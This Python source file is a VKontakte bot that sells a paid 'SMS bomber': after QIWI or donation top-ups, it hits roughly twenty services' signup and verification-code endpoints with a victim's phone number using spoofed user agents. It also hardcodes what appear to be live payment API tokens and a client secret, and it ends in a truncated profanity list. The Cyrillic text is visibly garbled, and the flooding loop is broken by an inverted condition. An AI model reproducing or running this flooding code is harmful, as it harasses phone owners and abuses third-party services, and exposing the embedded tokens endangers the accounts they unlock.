import vk_api, requests, time, threading, filemath, fake_useragent
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.utils import get_random_id
from vk_api.keyboard import VkKeyboard, VkKeyboardColor

print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")
keyboard = VkKeyboard(one_time=False)
# 1
keyboard.add_button('Bomber üí£', color=VkKeyboardColor.PRIMARY)
keyboard.add_button('–ü–æ–¥–¥–µ—Ä–∂–∫–∞ üë§', color=VkKeyboardColor.PRIMARY)
keyboard.add_line()
keyboard.add_button('–ë–∞–ª–∞–Ω—Å üí∞', color=VkKeyboardColor.PRIMARY)
keyboard.add_button('–ü–æ–ø–æ–ª–Ω–∏—Ç—å üí≥', color=VkKeyboardColor.PRIMARY)

clava2 = VkKeyboard(one_time=False)
clava2.add_button('–û–ø–ª–∞—Ç–∞ Qiwi ü•ù', color=VkKeyboardColor.PRIMARY)
clava2.add_line()
clava2.add_openlink_button('–î—Ä—É–≥–∏–µ —Å–ø–æ—Å–æ–±—ã', link='https://vk.com/bomberru?w=app6887721_-179699905')
clava2.add_line()
clava2.add_button('–ù–∞–∑–∞–¥ ‚Ü©', color=VkKeyboardColor.SECONDARY)

clava3 = VkKeyboard(one_time=False)
clava3.add_button('–ù–∞–∑–∞–¥ ‚Ü©', color=VkKeyboardColor.SECONDARY)

clava4 = VkKeyboard(one_time=False)
clava4.add_button('–ù–∞–∑–∞–¥ ‚Ü©', color=VkKeyboardColor.SECONDARY)

clava5 = VkKeyboard(one_time=False)
clava5.add_openlink_button('–û–ø–ª–∞—Ç–∏—Ç—å', link='https://qiwi.com/payment/form/99?amountFraction=00&currency=RUB&extra%5B%27account%27%5D=375296551581')
clava5.add_line()
clava5.add_button('–ù–∞–∑–∞–¥ ‚Ü©', color=VkKeyboardColor.PRIMARY)

clava6 = VkKeyboard(one_time=False)
clava6.add_button('–ó–∞–ø—É—Å—Ç–∏—Ç—å', color=VkKeyboardColor.POSITIVE)
clava6.add_button('–ù–∞–∑–∞–¥ ‚Ü©', color=VkKeyboardColor.SECONDARY)

def check(x):
    file = open('baza.txt', 'r', encoding='utf-8')
    if str(x) in file.read():
        return 1
    else:
        return 0
    file.close()


def adder(x):
    file = open('baza.txt', 'a', encoding='utf-8')
    file.write(f'{x}\n')

    file.close()


UsersId = open("baza.txt", "r")
UsersId2 = set()
for line in UsersId:
    UsersId2.add(line.strip())
UsersId.close()

suser = []
for user in UsersId2:
    suser.append(str(user))


def extract_aarg(aarg):
    return aarg.split()[0]


def extract_arg(arg):
    return arg.split()[1]


def extract_arg2(arg2):
    return arg2.split()[2]


def payment_history_last(my_login, api_access_token, rows_num, next_TxnId, next_TxnDate):
    # —Å–µ—Å—Å–∏—è –¥–ª—è —Ä–µ–∫—É–µ—Å—Ç
    s = requests.Session()
    # –¥–æ–±–∞–≤–ª—è–µ–º —Ä–µ–∫—É–µ—Å—Ç—É headers
    s.headers['authorization'] = 'Bearer ' + api_access_token
    # –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
    parameters = {'rows': rows_num, 'nextTxnId': next_TxnId, 'nextTxnDate': next_TxnDate}
    # —á–µ—Ä–µ–∑ —Ä–µ–∫—É–µ—Å—Ç –ø–æ–ª—É—á–∞–µ–º –ø–ª–∞—Ç–µ–∂—ã —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ - parameters
    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + my_login + '/payments', params=parameters)
    # –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ json –≤—Å–µ –æ–±—ä–µ–∫—Ç—ã –≤ –∫–∏–≤–∏ –∞–ø–∏ json
    return h.json()


mylogin = '375296551581'
api_access_token = '13517c96c7e5464cffd881e1906bd6d6'





def Donat():
    while True:
        time.sleep(20)
        user = fake_useragent.UserAgent().random
        headers = {'user_agent': user}
        r = requests.get('https://api.vkdonuts.ru/donates/get', headers=headers,
                          json={'group': '179699905', 'token': 'eebed2afe6f5ec6575f7a55eda9af596ae2a99ec73471a5868',
                                'v': '1', 'len': 1})
        r = r.json()
        time.sleep(20)
        sum = r['list'][0]['amount']
        txnId = r['list'][0]['date']
        comm = r['list'][0]['user']

        a = open("donat.txt", "r")
        lastpay = a.read()
        lastpay = str(lastpay)
        a.close()

        if lastpay == txnId:
            pass
        else:
            try:
                a = open(str(comm) + ".txt", "r")
                a.close()
                filemath.pmms(str(comm) + ".txt", "+" + str(sum))

                a = open("donat.txt", 'w')
                a.write(txnId)
                a.close()
                write_message(int(comm), "–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω–Ω–æ " + str(sum) + "—Ä\n\n–£–¥–∞—á–Ω—ã—Ö –ø–æ–∫—É–ø–æ–∫!")
            except:
                pass


Don = threading.Thread(target=Donat)
Don.start()


def QiwiCheck(number, api):
    while True:
        time.sleep(30)
        lastPayments = payment_history_last(number, api, '1', '', '')

        num = lastPayments['data'][0]['account']
        sum = lastPayments['data'][0]['sum']['amount']
        comm = lastPayments['data'][0]['comment']
        type = lastPayments['data'][0]['type']
        txnId = lastPayments['data'][0]['txnId']
        txnId = str(txnId)

        a = open("thlp.txt", "r")
        lastpay = a.read()
        lastpay = str(lastpay)
        a.close()

        if lastpay == txnId:
            pass
        else:
            try:
                a = open(str(comm[1:]) + ".txt", "r")
                a.close()
                filemath.pmms(str(comm[1:]) + ".txt", "+" + str(sum))

                a = open("thlp.txt", 'w')
                a.write(txnId)
                a.close()

                write_message(int(comm[1:]), "–ù–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω–Ω–æ " + str(sum) + "—Ä\n\n–£–¥–∞—á–Ω—ã—Ö –ø–æ–∫—É–ø–æ–∫!")

            except:
                pass


Tqiwi = threading.Thread(target=QiwiCheck, args=(mylogin, api_access_token))
Tqiwi.start()

def bomber(phone, vremya, dds, ddss):
    x = 0
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    v = int(vremya) * 10
    while x > v:
        x += 1
        try:
            requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={
                    "SignupForm[username]": phone,
                    "SignupForm[device_type]": 3,
                },
            )

        except:
            pass
        try:
            a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                              json={"reqId": "91101-1606335718",
                                    "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                               "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://youla.ru/web-api/auth/request_code",
                              json={"phone": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                "msisdn": phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763"
            }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                              json={"phone_number": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                              data={"phone": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                data={"st.r.phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://nn-card.ru/api/1.0/register",
                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                              json={"CellPhone": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                data={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                data={"l": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                              data={"CellPhone": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                              json={"lastName": "—É—Ü–≤—Ü—É", "firstName": "—Ü—É–≤—Ü—É", "middleName": "—Ü—É–∞—Ü—É–∞",
                                    "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                              json={"phone": phone[1:], "name": "–ï–≥–æ—Ä"}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                    "Mobile": phone[1:],
                                    "page": {"pageName": "home", "launchMode": "direct",
                                             "trafficType": ""}},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
                              data={"phone": phone},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                              json={
                                  "phone": "+" + phone,
                                  "api": 2,
                                  "email": 'dgirherfib@gmaqil.com',
                                  "x-email": "x-email",
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                              data={
                                  "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                  "username": phone,
                                  "client_id": "android-qw",
                                  "client_secret": "zAm4FKq9UnSe7id",
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                              json={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                              json={
                                  "birthday": {"day": 12, "month": 10, "year": 2000},
                                  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                  "include_verification_code": True,
                                  "password": 'Danil5564554',
                                  "phone_number": phone,
                                  "username": 'bhtrtrrrtbhtrbhtr',
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.telegram.org/auth/send_password",
                              data={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                params={'msisdn': phone}, headers=headers)
        except:
            pass


def write_message(sender, message):
    if i == 1:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': keyboard.get_keyboard()})
    if i == 2:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava2.get_keyboard()})
    if i == 3:
        authorize.method('messages.send', {'user_id': sender, 'message': message,
                                           "random_id": get_random_id(),
                                           'keyboard': clava3.get_keyboard()})
    if i == 4:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava4.get_keyboard()})
    if i == 5:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava5.get_keyboard()})
    if i == 6:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava6.get_keyboard()})

def rass(soob, xui, govno, jopa):
    if 1 == 1:
        UsersId = open("baza.txt", "r")
        UsersId2 = set()
        for line in UsersId:
            UsersId2.add(line.strip())
        UsersId.close()

        suser = []
        for user in UsersId2:
            suser.append(str(user))
        if a == 1:
            succes = 0
            fail = 0
            for user in suser:
                try:
                    with open(str(user) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(int(user), sms)
                    succes += 1
                except:
                    fail += 1
                    continue
            so_ob = "none"
            write_message("574170405", "–†–∞—Å—Å—ã–ª–∫—É –ø–æ–ª—É—á–∏–ª–æ - " + str(succes) + " –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π")
            write_message("574170405", "–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª–∏ –±–æ—Ç–∞ - " + str(fail) + " –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π")



sp_mat = ['6–ª—è', '6–ª—è–¥—å', '6–ª—è—Ç—å', 'b3—äe–±', 'cock', 'cunt', 'e6a–ª—å', 'ebal', 'eblan', 'e–±a–ª', 'e–±a—Ç—å', 'e–±y—á',
          'e–±–∞—Ç—å', 'e–±—ë—Ç', 'e–±–ª–∞–Ω—Ç–∏–π', 'fuck', 'fucker', 'fucking', 'xy—ë–≤', 'xy–π', 'xy—è', 'x—É–µ', 'x—É—é',
          'zaeb', 'zaebal', 'zaebali', 'zaebat', '–∞—Ä—Ö–∏–ø–∏–∑–¥—Ä–∏—Ç', '–∞—Ö—É–µ–ª', '–∞—Ö—É–µ—Ç—å', '–±–∑–¥–µ–Ω–∏–µ', '–±–∑–¥–µ—Ç—å', '–±–∑–¥–µ—Ö',
          '–±–∑–¥–µ—Ü—ã', '–±–∑–¥–∏—Ç', '–±–∑–¥–∏—Ü—ã', '–±–∑–¥–ª–æ', '–±–∑–¥–Ω—É—Ç—å', '–±–∑–¥—É–Ω', '–±–∑–¥—É–Ω—å—è', '–±–∑–¥—é—Ö–∞', '–±–∑–¥—é—à–∫–∞', '–±–∑–¥—é—à–∫–æ',
          '–±–ª—è', '–±–ª—è–±—É', '–±–ª—è–±—É–¥—É', '–±–ª—è–¥', '–±–ª—è–¥–∏', '–±–ª—è–¥–∏–Ω–∞', '–±–ª—è–¥–∏—â–µ', '–±–ª—è–¥–∫–∏', '–±–ª—è–¥–æ–≤–∞—Ç—å', '–±–ª—è–¥—Å—Ç–≤–æ',
          '–±–ª—è–¥—É–Ω', '–±–ª—è–¥—É–Ω—ã', '–±–ª—è–¥—É–Ω—å—è', '–±–ª—è–¥—å', '–±–ª—è–¥—é–≥–∞', '–±–ª—è—Ç—å', '–≤–∞—Ñ–µ–ª', '–≤–∞—Ñ–ª—ë—Ä', '–≤–∑—ä–µ–±–∫–∞', '–≤–∑—å–µ–±–∫–∞',
          '–≤–∑—å–µ–±—ã–≤–∞—Ç—å', '–≤—ä–µ–±', '–≤—ä–µ–±–∞–ª—Å—è', '–≤—ä–µ–±–µ–Ω–Ω', '–≤—ä–µ–±—É—Å—å', '–≤—ä–µ–±—ã–≤–∞—Ç—å', '–≤—ã–±–ª—è–¥–æ–∫', '–≤—ã–±–ª—è–¥—ã—à', '–≤—ã–µ–±',
          '–≤—ã–µ–±–∞—Ç—å', '–≤—ã–µ–±–µ–Ω', '–≤—ã–µ–±–Ω—É–ª—Å—è', '–≤—ã–µ–±–æ–Ω', '–≤—ã–µ–±—ã–≤–∞—Ç—å—Å—è', '–≤—ã–ø–µ—Ä–¥–µ—Ç—å', '–≤—ã—Å—Ä–∞—Ç—å—Å—è', '–≤—ã—Å—Å–∞—Ç—å—Å—è',
          '–≤—å–µ–±–µ–Ω', '–≥–∞–≤–Ω–æ', '–≥–∞–≤–Ω—é–∫', '–≥–∞–≤–Ω—é—á–∫–∞', '–≥–∞–º–Ω–æ', '–≥–∞–Ω–¥–æ–Ω', '–≥–Ω–∏–¥', '–≥–Ω–∏–¥–∞', '–≥–Ω–∏–¥—ã', '–≥–æ–≤–µ–Ω–∫–∞',
          '–≥–æ–≤–µ–Ω–Ω—ã–π', '–≥–æ–≤–µ—à–∫–∞', '–≥–æ–≤–Ω–∞–∑–∏—è', '–≥–æ–≤–Ω–µ—Ü–æ', '–≥–æ–≤–Ω–∏—â–µ', '–≥–æ–≤–Ω–æ', '–≥–æ–≤–Ω–æ–µ–¥', '–≥–æ–≤–Ω–æ–ª–∏–Ω–∫', '–≥–æ–≤–Ω–æ—á–∏—Å—Ç',
          '–≥–æ–≤–Ω—é–∫', '–≥–æ–≤–Ω—é—Ö–∞', '–≥–æ–≤–Ω—è–¥–∏–Ω–∞', '–≥–æ–≤–Ω—è–∫', '–≥–æ–≤–Ω—è–Ω—ã–π', '–≥–æ–≤–Ω—è—Ç—å', '–≥–æ–Ω–¥–æ–Ω', '–¥–æ–µ–±—ã–≤–∞—Ç—å—Å—è', '–¥–æ–ª–±–æ–µ–±',
          '–¥–æ–ª–±–æ—ë–±', '–¥–æ–ª–±–æ—è—â–µ—Ä', '–¥—Ä–∏—Å–Ω—è', '–¥—Ä–∏—Å—Ç', '–¥—Ä–∏—Å—Ç–∞–Ω—É—Ç—å', '–¥—Ä–∏—Å—Ç–∞—Ç—å', '–¥—Ä–∏—Å—Ç—É–Ω', '–¥—Ä–∏—Å—Ç—É—Ö–∞', '–¥—Ä–æ—á–µ–ª–ª–æ',
          '–¥—Ä–æ—á–µ–Ω–∞', '–¥—Ä–æ—á–∏–ª–∞', '–¥—Ä–æ—á–∏–ª–∫–∞', '–¥—Ä–æ—á–∏—Å—Ç—ã–π', '–¥—Ä–æ—á–∏—Ç—å', '–¥—Ä–æ—á–∫–∞', '–¥—Ä–æ—á—É–Ω', '–µ6–∞–ª', '–µ6—É—Ç', '–º–∞—Ç—å',
          '–º–∞—Ç—å', '—ë–±a–Ω', '–µ–±a—Ç—å', '–µ–±y—á', '–µ–±–∞–ª', '–µ–±–∞–ª–æ', '–µ–±–∞–ª—å–Ω–∏–∫', '–µ–±–∞–Ω', '–µ–±–∞–Ω–∞–º–∞—Ç—å', '–µ–±–∞–Ω–∞—Ç', '–µ–±–∞–Ω–∞—è',
          '—ë–±–∞–Ω–∞—è', '–µ–±–∞–Ω–∏—á–µ—Å–∫–∏–π', '–µ–±–∞–Ω–Ω—ã–π', '–µ–±–∞–Ω–Ω—ã–π–≤—Ä–æ—Ç', '–µ–±–∞–Ω–æ–µ', '–µ–±–∞–Ω—É—Ç—å', '–µ–±–∞–Ω—É—Ç—å—Å—è', '—ë–±–∞–Ω—É—é', '–µ–±–∞–Ω—ã–π',
          '–µ–±–∞–Ω—å–∫–æ', '–µ–±–∞—Ä—å', '–µ–±–∞—Ç', '—ë–±–∞—Ç', '–µ–±–∞—Ç–æ—Ä–∏—è', '–µ–±–∞—Ç—å', '–µ–±–∞—Ç—å-–∫–æ–ø–∞—Ç—å', '–µ–±–∞—Ç—å—Å—è', '–µ–±–∞—à–∏—Ç—å', '–µ–±—ë–Ω–∞',
          '–µ–±–µ—Ç', '–µ–±—ë—Ç', '–µ–±–µ—Ü', '–µ–±–∏–∫', '–µ–±–∏–Ω', '–µ–±–∏—Å—å', '–µ–±–∏—á–µ—Å–∫–∞—è', '–µ–±–∫–∏', '–µ–±–ª–∞', '–µ–±–ª–∞–Ω', '–µ–±–ª–∏–≤—ã–π',
          '–µ–±–ª–∏—â–µ', '–µ–±–ª–æ', '–µ–±–ª—ã—Å—Ç', '–µ–±–ª—è', '—ë–±–Ω', '–µ–±–Ω—É—Ç—å', '–µ–±–Ω—É—Ç—å—Å—è', '–µ–±–Ω—è', '–µ–±–æ—à–∏—Ç—å', '–µ–±—Å–∫–∞—è', '–µ–±—Å–∫–∏–π',
          '–µ–±—Ç–≤–æ—é–º–∞—Ç—å', '–µ–±—É–Ω', '–µ–±—É—Ç', '–µ–±—É—á', '–µ–±—É—á–µ', '–µ–±—É—á–µ–µ', '–µ–±—É—á–∏–π', '–µ–±—É—á–∏–º', '–µ–±—É—â', '–µ–±—ã—Ä—å', '–µ–ª–¥–∞',
          '–µ–ª–¥–∞–∫', '–µ–ª–¥–∞—á–∏—Ç—å', '–∂–æ–ø–∞', '–∂–æ–ø—É', '–∑–∞–≥–æ–≤–Ω—è—Ç—å', '–∑–∞–¥—Ä–∞—á–∏–≤–∞—Ç—å', '–∑–∞–¥—Ä–∏—Å—Ç–∞—Ç—å', '–∑–∞–¥—Ä–æ—Ç–∞', '–∑–∞–µ6', '–∑–∞—ë6',
          '–∑–∞–µ–±', '–∑–∞—ë–±', '–∑–∞–µ–±–∞', '–∑–∞–µ–±–∞–ª', '–∑–∞–µ–±–∞–Ω–µ—Ü', '–∑–∞–µ–±–∞—Å—Ç–∞—è', '–∑–∞–µ–±–∞—Å—Ç—ã–π', '–∑–∞–µ–±–∞—Ç—å', '–∑–∞–µ–±–∞—Ç—å—Å—è',
          '–∑–∞–µ–±–∞—à–∏—Ç—å', '–∑–∞–µ–±–∏—Å—Ç–æ–µ', '–∑–∞—ë–±–∏—Å—Ç–æ–µ', '–∑–∞–µ–±–∏—Å—Ç—ã–µ', '–∑–∞—ë–±–∏—Å—Ç—ã–µ', '–∑–∞–µ–±–∏—Å—Ç—ã–π', '–∑–∞—ë–±–∏—Å—Ç—ã–π', '–∑–∞–µ–±–∏—Å—å',
          '–∑–∞–µ–±–æ—à–∏—Ç—å', '–∑–∞–µ–±—ã–≤–∞—Ç—å—Å—è', '–∑–∞–ª—É–ø', '–∑–∞–ª—É–ø–∞', '–∑–∞–ª—É–ø–∞—Ç—å—Å—è', '–∑–∞–ª—É–ø–∏—Ç—å', '–∑–∞–ª—É–ø–∏—Ç—å—Å—è', '–∑–∞–º—É–¥–æ—Ö–∞—Ç—å—Å—è',
          '–∑–∞–ø–∏–∑–¥—è—á–∏—Ç—å', '–∑–∞—Å–µ—Ä–∞—Ç—å', '–∑–∞—Å–µ—Ä—É–Ω', '–∑–∞—Å–µ—Ä—è', '–∑–∞—Å–∏—Ä–∞—Ç—å', '–∑–∞—Å—Ä—É–Ω', '–∑–∞—Ö—É—è—á–∏—Ç—å', '–∑–∞—è–±–µ—Å—Ç–∞—è', '–∑–ª–æ–µ–±',
          '–∑–ª–æ–µ–±—É—á–∞—è', '–∑–ª–æ–µ–±—É—á–µ–µ', '–∑–ª–æ–µ–±—É—á–∏–π', '–∏–±–∞–Ω–∞–º–∞—Ç', '–∏–±–æ–Ω–µ—Ö', '–∏–∑–≥–æ–≤–Ω—è—Ç—å', '–∏–∑–≥–æ–≤–Ω—è—Ç—å—Å—è', '–∏–∑—ä–µ–±–Ω—É—Ç—å—Å—è',
          '–∏–ø–∞—Ç—å', '–∏–ø–∞—Ç—å—Å—è', '–∏–ø–∞—Ü—Ü–æ', '–ö–∞–∫–¥–≤–∞–ø–∞–ª—å—Ü–∞–æ–±–æ—Å—Å–∞—Ç—å', '–∫–æ–Ω—á–∞', '–∫—É—Ä–≤–∞', '–∫—É—Ä–≤—è—Ç–Ω–∏–∫', '–ª–æ—Ö', '–ª–æ—à–∞—Äa',
          '–ª–æ—à–∞—Ä–∞', '–ª–æ—à–∞—Ä—ã', '–ª–æ—à–æ–∫', '–ª—è—Ä–≤–∞', '–º–∞–ª–∞—Ñ—å—è', '–º–∞–Ω–¥–∞', '–º–∞–Ω–¥–∞–≤–æ—à–µ–∫', '–º–∞–Ω–¥–∞–≤–æ—à–∫–∞', '–º–∞–Ω–¥–∞–≤–æ—à–∫–∏',
          '–º–∞–Ω–¥–µ–π', '–º–∞–Ω–¥–µ–Ω—å', '–º–∞–Ω–¥–µ—Ç—å', '–º–∞–Ω–¥–∏—â–∞', '–º–∞–Ω–¥–æ–π', '–º–∞–Ω–¥—É', '–º–∞–Ω–¥—é–∫', '–º–∏–Ω–µ—Ç', '–º–∏–Ω–µ—Ç—á–∏–∫', '–º–∏–Ω–µ—Ç—á–∏—Ü–∞',
          '–º–ª—è—Ç—å', '–º–æ–∫—Ä–æ—â–µ–ª–∫–∞', '–º–æ–∫—Ä–æ—â—ë–ª–∫–∞', '–º—Ä–∞–∑—å', '–º—É–¥ak', '–º—É–¥a–∫', '–º—É–¥–∞–≥', '–º—É–¥–∞–∫', '–º—É–¥–µ', '–º—É–¥–µ–ª—å',
          '–º—É–¥–µ—Ç—å', '–º—É–¥–∏', '–º—É–¥–∏–ª', '–º—É–¥–∏–ª–∞', '–º—É–¥–∏—Å—Ç—ã–π', '–º—É–¥–Ω—è', '–º—É–¥–æ–µ–±', '–º—É–¥–æ–∑–≤–æ–Ω', '–º—É–¥–æ–∫–ª—é–π', '—Ö–µ—Ä', '—Ö—É–π',
          '–Ω–∞–±–∑–¥–µ–ª', '–Ω–∞–±–∑–¥–µ—Ç—å', '–Ω–∞–≥–æ–≤–Ω—è—Ç—å', '–Ω–∞–¥—Ä–∏—Å—Ç–∞—Ç—å', '–Ω–∞–¥—Ä–æ—á–∏—Ç—å', '–Ω–∞–µ–±–∞—Ç—å', '–Ω–∞–µ–±–µ—Ç', '–Ω–∞–µ–±–Ω—É—Ç—å',
          '–Ω–∞–µ–±–Ω—É—Ç—å—Å—è', '–Ω–∞–µ–±—ã–≤–∞—Ç—å', '–Ω–∞–ø–∏–∑–¥–µ–ª', '–Ω–∞–ø–∏–∑–¥–µ–ª–∏', '–Ω–∞–ø–∏–∑–¥–µ–ª–æ', '–Ω–∞–ø–∏–∑–¥–∏–ª–∏', '–Ω–∞—Å—Ä–∞—Ç—å', '–Ω–∞—Å—Ç–æ–ø–∏–∑–¥–∏—Ç—å',
          '–Ω–∞—Ö–µ—Ä', '–Ω–∞—Ö—Ä–µ–Ω', '–Ω–∞—Ö—É–π', '–Ω–∞—Ö—É–π–Ω–∏–∫', '–µ–±–µ—Ç', '–µ–±—ë—Ç', '–Ω–µ–≤—Ä–æ—Ç–µ–±—É—á–∏–π', '–Ω–µ–≤—ä–µ–±–µ–Ω–Ω–æ', '–Ω–µ—Ö–∏—Ä–∞', '–Ω–µ—Ö—Ä–µ–Ω',
          '–ù–µ—Ö—É–π', '–Ω–µ—Ö—É–π—Å—Ç–≤–µ–Ω–Ω–æ', '–Ω–∏–∏–±–∞—Ü–æ', '–Ω–∏–∏–ø–∞—Ü—Ü–∞', '–Ω–∏–∏–ø–∞—Ü—Ü–æ', '–Ω–∏–∏–ø–µ—Ç', '–Ω–∏–∫—É—è', '–Ω–∏—Ö–µ—Ä–∞', '–Ω–∏—Ö—É—è',
          '–æ–±–¥—Ä–∏—Å—Ç–∞—Ç—å—Å—è', '–æ–±–æ—Å—Ä–∞–Ω–µ—Ü', '–æ–±–æ—Å—Ä–∞—Ç—å', '–æ–±–æ—Å—Ü–∞—Ç—å', '–æ–±–æ—Å—Ü–∞—Ç—å—Å—è', '–æ–±—Å–∏—Ä–∞—Ç—å', '–æ–±—ä–µ–±–æ—Å', '–æ–±—å–µ–±–æ—Å',
          '–æ–¥–Ω–æ—Ö—É–π—Å—Ç–≤–µ–Ω–Ω–æ', '–æ–ø–µ–∑–¥–∞–ª', '–æ–ø–∏–∑–¥–µ', '–æ–ø–∏–∑–¥–µ–Ω–∏–≤–∞—é—â–µ', '–æ—Å—Ç–æ–µ–±–µ–Ω–∏—Ç—å', '–æ—Å—Ç–æ–ø–∏–∑–¥–µ—Ç—å', '–æ—Ç–º—É–¥–æ—Ö–∞—Ç—å',
          '–æ—Ç–ø–∏–∑–¥–∏—Ç—å', '–æ—Ç–ø–∏–∑–¥—è—á–∏—Ç—å', '–æ—Ç–ø–æ—Ä–æ—Ç—å', '–æ—Ç—ä–µ–±–∏—Å—å', '–æ—Ö—É–µ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π', '–æ—Ö—É–µ–≤–∞—Ç—å', '–æ—Ö—É–µ–≤–∞—é—â–∏–π', '–æ—Ö—É–µ–ª',
          '–æ—Ö—É–µ–Ω–Ω–æ', '–æ—Ö—É–µ–Ω—å—á–∏–∫', '–æ—Ö—É–µ—Ç—å', '–æ—Ö—É–∏—Ç–µ–ª—å–Ω–æ', '–æ—Ö—É–∏—Ç–µ–ª—å–Ω—ã–π', '–æ—Ö—É—è–Ω—å—á–∏–∫', '–æ—Ö—É—è—á–∏–≤–∞—Ç—å', '–æ—Ö—É—è—á–∏—Ç—å',
          '–æ—á–∫—É–Ω', '–ø–∞–¥–ª–∞', '–ø–∞–¥–æ–Ω–∫–∏', '–ø–∞–¥–æ–Ω–æ–∫', '–ø–∞—Å–∫—É–¥–∞', '–ø–µ–¥–µ—Ä–∞—Å', '–ø–µ–¥–∏–∫', '–ø–µ–¥—Ä–∏–∫', '–ø–µ–¥—Ä–∏–ª–∞', '–ø–µ–¥—Ä–∏–ª–ª–æ',
          '–ø–µ–¥—Ä–∏–ª–æ', '–ø–µ–¥—Ä–∏–ª—ã', '–ø–µ–∑–¥–µ–Ω—å', '–ø–µ–∑–¥–∏—Ç', '–ø–µ–∑–¥–∏—à—å', '–ø–µ–∑–¥–æ', '–ø–µ–∑–¥—è—Ç', '–ø–µ—Ä–¥–∞–Ω—É—Ç—å', '–ø–µ—Ä–¥–µ–∂',
          '–ø–µ—Ä–¥–µ–Ω–∏–µ', '–ø–µ—Ä–¥–µ—Ç—å', '–ø–µ—Ä–¥–∏–ª—å–Ω–∏–∫', '–ø–µ—Ä–¥–Ω—É—Ç—å', '–ø—ë—Ä–¥–Ω—É—Ç—å', '–ø–µ—Ä–¥—É–Ω', '–ø–µ—Ä–¥—É–Ω–µ—Ü', '–ø–µ—Ä–¥—É–Ω–∏–Ω–∞',
          '–ø–µ—Ä–¥—É–Ω—å—è', '–ø–µ—Ä–¥—É—Ö–∞', '–ø–µ—Ä–¥—å', '–ø–µ—Ä–µ—ë–±–æ–∫', '–ø–µ—Ä–Ω—É—Ç—å', '–ø—ë—Ä–Ω—É—Ç—å', '–ø–∏3–¥', '–ø–∏3–¥–µ', '–ø–∏3–¥—É', '–ø–∏z–¥–µ—Ü',
